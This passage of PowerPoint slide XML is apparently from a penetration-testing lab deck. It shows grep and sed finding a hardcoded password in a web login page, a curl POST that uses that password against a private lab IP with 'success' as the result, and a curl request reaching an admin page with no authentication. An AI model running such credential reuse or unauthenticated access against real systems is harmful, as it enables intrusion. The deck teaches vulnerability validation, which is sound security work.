        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2121408"/>
            <a:ext cx="4892040" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BUT this was only a clue from a wordlist — not yet proven.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2606040"/>
            <a:ext cx="5349240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2697480"/>
            <a:ext cx="5020056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ grep -RniE '...' /var/www/html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3246120"/>
            <a:ext cx="5349240" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3246120"/>
            <a:ext cx="4937760" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>→  /var/www/html/root/log_in/meaco/login.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3886200"/>
            <a:ext cx="5349240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3977640"/>
            <a:ext cx="5020056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ sed -n '1,80p' login.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4526280"/>
            <a:ext cx="5349240" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4526280"/>
            <a:ext cx="4937760" cy="68580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username  /  KeepR3ading@b00ks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5257800"/>
            <a:ext cx="5349240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Note the letter-case difference from the FTP clue (b00ks vs B00ks).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1371600"/>
            <a:ext cx="5440680" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5085"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6336792" y="1463040"/>
            <a:ext cx="5111496" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -i -c cookies.txt -X POST \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   -d 'uname=username&amp;password=KeepR3ading@b00ks&amp;submit=Login' \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   http://192.168.76.157/root/log_in/meaco/login.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2697480"/>
            <a:ext cx="5440680" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12308"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="2697480"/>
            <a:ext cx="1188720" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Result:  </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="2697480"/>
            <a:ext cx="4023360" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>success</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3520440"/>
            <a:ext cx="5440680" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4324"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3657600"/>
            <a:ext cx="4983480" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>DISCOVERY ≠ VALIDATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3977640"/>
            <a:ext cx="4983480" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Finding a credential-looking string in source code is DISCOVERY. It only becomes a VALIDATED, confirmed credential once submitted to the live login endpoint and observed to actually succeed — which is exactly what the request above did.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15</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07 · APPLICATION VULNERABILITIES</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Authentication vs. Broken Access Control</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5349240" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1554480"/>
            <a:ext cx="4892040" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1. Valid credentials exist</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1901952"/>
            <a:ext cx="4892040" cy="59436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Confirmed in source code and validated via login (previous slide).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="5440680" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1554480"/>
            <a:ext cx="4983480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2. The page needs NO credentials at all</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1901952"/>
            <a:ext cx="4983480" cy="59436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The admin/profile page was also directly reachable with zero authentication.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2788920"/>
            <a:ext cx="11064240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2880360"/>
            <a:ext cx="10735056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -i http://192.168.76.157/root/log_in/admin/B00kYouRProFile.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3474720"/>
            <a:ext cx="5394960" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3584448"/>
            <a:ext cx="4937760" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>EXPECTED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3858768"/>
            <a:ext cx="4937760" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>401 / 403, or a redirect to the login page</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3474720"/>
            <a:ext cx="5440680" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
